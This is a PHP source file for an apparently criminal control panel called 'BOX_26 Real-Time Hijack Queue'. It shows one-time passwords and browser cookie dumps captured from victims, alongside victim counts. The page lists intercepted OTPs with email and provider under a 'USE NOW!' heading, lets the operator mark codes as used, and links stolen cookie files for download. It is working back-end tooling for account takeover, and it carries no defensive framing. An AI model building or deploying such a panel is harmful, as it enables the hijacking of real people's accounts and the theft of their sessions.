<?php
session_start();
if (!($_SESSION['logged_in'] ?? false)) { header('Location: index.php'); exit; }

define('DB_FILE', '../storage/box26.db');

try {
    $db = new PDO('sqlite:' . DB_FILE);
    $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (Exception $e) { die("Database error"); }

if ($_POST['mark_used'] ?? false) {
    $stmt = $db->prepare("UPDATE otps SET used = 1 WHERE id = ?");
    $stmt->execute([$_POST['mark_used']]);
}

$otps = $db->query("SELECT * FROM otps WHERE used = 0 ORDER BY captured_at DESC LIMIT 50")->fetchAll(PDO::FETCH_ASSOC);
$cookies = $db->query("SELECT * FROM cookie_dumps ORDER BY timestamp DESC LIMIT 20")->fetchAll(PDO::FETCH_ASSOC);
$totalVictims = $db->query("SELECT COUNT(DISTINCT victim_id) FROM otps")->fetchColumn();
$pendingOtps = $db->query("SELECT COUNT(*) FROM otps WHERE used = 0")->fetchColumn();
$totalCookies = $db->query("SELECT COUNT(*) FROM cookie_dumps")->fetchColumn();
?>
<!DOCTYPE html>
<html>
<head>
    <title>BOX_26 - Hijack Queue</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { background:#0a0e1a; color:#00ff9d; font-family:'Courier New',monospace; padding:20px; }
        .header { display:flex; justify-content:space-between; align-items:center; margin-bottom:30px; border-bottom:1px solid #00ff9d; padding-bottom:10px; }
        .title { font-size:24px; font-weight:bold; }
        .nav a { color:#00ff9d; text-decoration:none; margin-left:20px; }
        .nav a:hover { text-decoration:underline; }
        .grid { display:grid; grid-template-columns:1fr 1fr; gap:20px; }
        .panel { background:#1a1f2f; border:1px solid #00ff9d; border-radius:5px; padding:20px; }
        .panel h2 { margin-bottom:20px; color:#fff; }
        table { width:100%; border-collapse:collapse; }
        th { text-align:left; color:#00ff9d; border-bottom:1px solid #00ff9d; padding:10px 0; }
        td { padding:10px 0; border-bottom:1px solid #2a2f3f; }
        .otp-code { font-size:20px; font-weight:bold; color:#ffff00; }
        .stats { display:grid; grid-template-columns:repeat(3,1fr); gap:10px; margin-bottom:20px; }
        .stat-box { background:#0a0e1a; padding:15px; text-align:center; border:1px solid #00ff9d; }
        .stat-number { font-size:32px; font-weight:bold; }
        .stat-label { font-size:12px; color:#888; }
    </style>
</head>
<body>
    <div class="header">
        <div class="title">🎯 BOX_26 REAL-TIME HIJACK QUEUE</div>
        <div class="nav">
            <a href="hijack.php">🔄 Refresh</a>
            <a href="cookies.php">🍪 Cookies</a>
            <a href="?logout=1">🚪 Logout</a>
        </div>
    </div>
    
    <div class="stats">
        <div class="stat-box"><div class="stat-number"><?= $totalVictims ?></div><div class="stat-label">Total Victims</div></div>
        <div class="stat-box"><div class="stat-number"><?= $pendingOtps ?></div><div class="stat-label">Pending OTPs</div></div>
        <div class="stat-box"><div class="stat-number"><?= $totalCookies ?></div><div class="stat-label">Cookie Dumps</div></div>
    </div>
    
    <div class="grid">
        <div class="panel">
            <h2>🔑 PENDING OTPS (USE NOW!)</h2>
            <table>
                <tr><th>Time</th><th>Victim</th><th>Provider</th><th>Email</th><th>OTP</th><th>Action</th></tr>
                <?php foreach ($otps as $otp): ?>
                <tr>
                    <td><?= date('H:i:s', strtotime($otp['captured_at'])) ?></td>
                    <td><?= substr($otp['victim_id'], 0, 8) ?>..</td>
                    <td><?= $otp['provider'] ?></td>
                    <td><?= substr($otp['email'], 0, 15) ?>..</td>
                    <td class="otp-code"><?= $otp['otp'] ?></td>
                    <td>
                        <form method="POST" style="display:inline;">
                            <input type="hidden" name="mark_used" value="<?= $otp['id'] ?>">
                            <button style="background:#00ff9d; color:#000; border:none; padding:5px; cursor:pointer;">✓</button>
                        </form>
                    </td>
                </tr>
                <?php endforeach; ?>
                <?php if (empty($otps)): ?>
                <tr><td colspan="6" style="text-align:center; padding:20px;">No pending OTPs</td></tr>
                <?php endif; ?>
            </table>
        </div>
        
        <div class="panel">
            <h2>🍪 RECENT COOKIE DUMPS</h2>
            <table>
                <tr><th>Time</th><th>Victim</th><th>Cookies</th><th>File</th></tr>
                <?php foreach ($cookies as $cookie): ?>
                <tr>
                    <td><?= date('H:i', strtotime($cookie['timestamp'])) ?></td>
                    <td><?= substr($cookie['victim_id'], 0, 8) ?>..</td>
                    <td><?= $cookie['cookie_count'] ?></td>
                    <td><a href="../<?= $cookie['filename'] ?>" download>📥</a></td>
                </tr>
                <?php endforeach; ?>
            </table>
        </div>
    </div>
</body>
</html>
